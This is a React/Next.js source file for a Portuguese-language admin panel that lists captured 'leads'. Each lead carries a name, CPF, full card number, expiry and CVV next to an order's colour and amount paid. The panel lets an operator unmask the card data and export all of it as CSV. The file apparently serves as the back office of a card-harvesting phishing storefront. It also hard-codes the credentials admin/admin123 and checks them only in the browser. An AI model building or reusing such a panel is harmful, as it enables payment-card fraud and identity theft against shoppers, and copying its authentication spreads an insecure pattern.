"use client";

import { useState, useEffect, useCallback } from "react";
import { Eye, EyeOff, Download, LogOut, Loader2, Shield } from "lucide-react";
import { maskCard, maskCpf, maskCvv } from "@/lib/mask";

interface Lead {
  id: string;
  nome: string;
  email: string;
  telefone: string;
  cpf: string;
  numeroCartao: string;
  validade: string;
  cvv: string;
  corSelecionada: string;
  quantidade: number;
  totalPago: number;
  dataCriacao: string;
}

export default function AdminPage() {
  const [authenticated, setAuthenticated] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loginError, setLoginError] = useState("");
  const [leads, setLeads] = useState<Lead[]>([]);
  const [loading, setLoading] = useState(false);
  const [revealed, setRevealed] = useState<Record<string, boolean>>({});

  const fetchLeads = useCallback(async () => {
    setLoading(true);
    try {
      const res = await fetch("/api/admin/leads", {
        headers: { "x-admin-auth": "admin:admin123" },
      });
      if (res.ok) {
        const data = await res.json();
        setLeads(data.leads || []);
      }
    } catch {
      console.error("Erro ao carregar leads");
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    if (authenticated) fetchLeads();
  }, [authenticated, fetchLeads]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (username === "admin" && password === "admin123") {
      setAuthenticated(true);
      setLoginError("");
    } else {
      setLoginError("Credenciais inválidas");
    }
  };

  const toggleReveal = (id: string) => {
    setRevealed((prev) => ({ ...prev, [id]: !prev[id] }));
  };

  const handleExport = async () => {
    try {
      const res = await fetch("/api/admin/export", {
        headers: { "x-admin-auth": "admin:admin123" },
      });
      if (!res.ok) throw new Error("Falha no export");
      const blob = await res.blob();
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `leads-${new Date().toISOString().slice(0, 10)}.csv`;
      a.click();
      URL.revokeObjectURL(url);
    } catch {
      alert("Erro ao exportar CSV");
    }
  };

  if (!authenticated) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-lg p-8 w-full max-w-sm">
          <div className="flex items-center justify-center gap-2 mb-6">
            <Shield className="text-brand-blue" size={28} />
            <h1 className="text-xl font-bold text-gray-900">Painel Admin</h1>
          </div>
          <form onSubmit={handleLogin} className="space-y-4">
            <input
              type="text"
              placeholder="Usuário"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-brand-blue/40 text-sm"
            />
            <input
              type="password"
              placeholder="Senha"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-brand-blue/40 text-sm"
            />
            {loginError && <p className="text-sm text-red-500">{loginError}</p>}
            <button
              type="submit"
              className="w-full py-3 bg-brand-blue text-white font-semibold rounded-xl hover:bg-blue-600 transition-colors"
            >
              Entrar
            </button>
          </form>
          <p className="text-xs text-center text-gray-400 mt-4">Demo: admin / admin123</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-white border-b border-gray-200 sticky top-0 z-10">
        <div className="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Shield className="text-brand-blue" size={22} />
            <h1 className="font-bold text-gray-900">Painel Administrativo</h1>
          </div>
          <div className="flex items-center gap-3">
            <button
              onClick={handleExport}
              className="flex items-center gap-1.5 px-3 py-2 text-sm font-medium bg-green-50 text-green-700 rounded-lg hover:bg-green-100 transition-colors"
            >
              <Download size={16} />
              Exportar CSV
            </button>
            <button
              onClick={() => setAuthenticated(false)}
              className="flex items-center gap-1.5 px-3 py-2 text-sm font-medium text-gray-600 hover:bg-gray-100 rounded-lg transition-colors"
            >
              <LogOut size={16} />
              Sair
            </button>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 py-6">
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-lg font-semibold text-gray-800">Leads ({leads.length})</h2>
          <button onClick={fetchLeads} className="text-sm text-brand-blue hover:underline">
            Atualizar
          </button>
        </div>

        {loading ? (
          <div className="flex justify-center py-20">
            <Loader2 className="animate-spin text-brand-blue" size={32} />
          </div>
        ) : leads.length === 0 ? (
          <div className="text-center py-20 text-gray-400">Nenhum lead capturado ainda.</div>
        ) : (
          <div className="overflow-x-auto bg-white rounded-2xl shadow-sm border border-gray-100">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b border-gray-100 text-left text-gray-500">
                  <th className="px-4 py-3 font-medium">Nome</th>
                  <th className="px-4 py-3 font-medium">Email</th>
                  <th className="px-4 py-3 font-medium">Telefone</th>
                  <th className="px-4 py-3 font-medium">CPF</th>
                  <th className="px-4 py-3 font-medium">Cartão</th>
                  <th className="px-4 py-3 font-medium">Validade</th>
                  <th className="px-4 py-3 font-medium">CVV</th>
                  <th className="px-4 py-3 font-medium">Data</th>
                  <th className="px-4 py-3 font-medium">Ações</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-50">
                {leads.map((lead) => {
                  const isRevealed = revealed[lead.id];
                  return (
                    <tr key={lead.id} className="hover:bg-gray-50/50">
                      <td className="px-4 py-3 font-medium text-gray-900 whitespace-nowrap">{lead.nome}</td>
                      <td className="px-4 py-3 text-gray-600 whitespace-nowrap">{lead.email}</td>
                      <td className="px-4 py-3 text-gray-600 whitespace-nowrap">{lead.telefone}</td>
                      <td className="px-4 py-3 font-mono text-xs whitespace-nowrap">
                        {isRevealed ? lead.cpf : maskCpf(lead.cpf)}
                      </td>
                      <td className="px-4 py-3 font-mono text-xs whitespace-nowrap">
                        {isRevealed ? lead.numeroCartao : maskCard(lead.numeroCartao)}
                      </td>
                      <td className="px-4 py-3 whitespace-nowrap">{lead.validade}</td>
                      <td className="px-4 py-3 font-mono text-xs whitespace-nowrap">
                        {isRevealed ? lead.cvv : maskCvv()}
                      </td>
                      <td className="px-4 py-3 text-gray-500 whitespace-nowrap">
                        {new Date(lead.dataCriacao).toLocaleString("pt-BR")}
                      </td>
                      <td className="px-4 py-3">
                        <button
                          onClick={() => toggleReveal(lead.id)}
                          className="flex items-center gap-1 text-xs font-medium text-brand-blue hover:underline"
                        >
                          {isRevealed ? <EyeOff size={14} /> : <Eye size={14} />}
                          {isRevealed ? "Ocultar" : "Revelar"}
                        </button>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        )}
      </main>
    </div>
  );
}
